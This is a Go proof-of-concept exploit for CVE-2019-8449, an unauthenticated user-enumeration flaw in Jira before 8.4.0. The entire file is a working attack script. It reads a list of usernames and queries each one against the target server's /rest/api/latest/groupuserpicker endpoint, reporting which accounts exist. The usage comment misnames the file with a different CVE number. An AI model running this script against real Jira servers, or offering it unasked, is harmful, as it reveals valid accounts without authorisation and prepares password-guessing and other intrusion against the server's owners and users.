// Proof Of Concept - CVE-2019-8449
// Jira < 8.4.0
// https://www.cvedetails.com/cve/CVE-2019-8449
// author: Roland Heimpoldinger
// @r0labsecurity
// ---
// Usage
// $ go run CVE-2019-8849.go -f USERFILE.txt -p 8080 -u example.com
 
package main

import (
	"io/ioutil"
	"log"
	"net"
	"net/url"
	"net/http"
	"os"
	"flag"
	"fmt"
	"strconv"
	"strings"
	"bufio"
)

func makeRequest(urlStr string, port int, ssl bool, username string) {
	if username == "" {
		return
	}

	urlPraefix := "http://"

	if ssl == true {
		urlPraefix = "https://"
	}

	urlStr = urlPraefix + urlStr + ":" + strconv.Itoa(port) + "/rest/api/latest/groupuserpicker"
	u, _ := url.Parse(urlStr)
	q, _ := url.ParseQuery(u.RawQuery)

	q.Add("issueType", "")
	q.Add("showAvatar", "false")
	q.Add("caseInsensitive", "true")
	q.Add("excludeConnectAddons", "")
	q.Add("projectId", "")
	q.Add("query", username)
	q.Add("fieldId", "")
	q.Add("avatarSize", "")
	q.Add("maxResults", "")
	payload := q.Encode()

	urlStr += "?" + payload

	resp, err := http.Get(urlStr)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Printf("[] Checking username '%s' ", username)

	if strings.Contains(string(body), "name") {
		fmt.Printf(" - FOUND!\n")
	} else {
		fmt.Printf("\n")
	}
}


func main() {
	urlPtr := flag.String("u", "", "URL to Jira-Server (required)")
	portPtr := flag.Int("p", 80, "Port")
	usrfilePtr := flag.String("f", "", "USERFILE.TXT (required)")
	sslPtr := flag.Bool("SSL", false, "SSL On")

	flag.Parse()

	if *urlPtr == ""  || *usrfilePtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	} else {
		// check url param for hostname or ip
		hostname := net.ParseIP(*urlPtr)
		if hostname == nil {
			// got hostname
			_, err := net.LookupHost(*urlPtr)
			if err != nil {
				log.Fatalln("[!] can not lookup hostname '%s'\n", *urlPtr)
			}
		}
	}

	if *portPtr > 65534 || *portPtr < 1 {
		log.Fatalln("[!] check your port\n")
	}

	usrFile, err := os.Open(*usrfilePtr)

	if err != nil {
		log.Fatalln("[!] failed opening file '%s': %s", *usrfilePtr, err)
	}

	scanner := bufio.NewScanner(usrFile)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	usrFile.Close()

	for _, username := range txtlines {
		makeRequest(*urlPtr, *portPtr, *sslPtr, username)
	}

	fmt.Printf("\nfinished.\n")
}
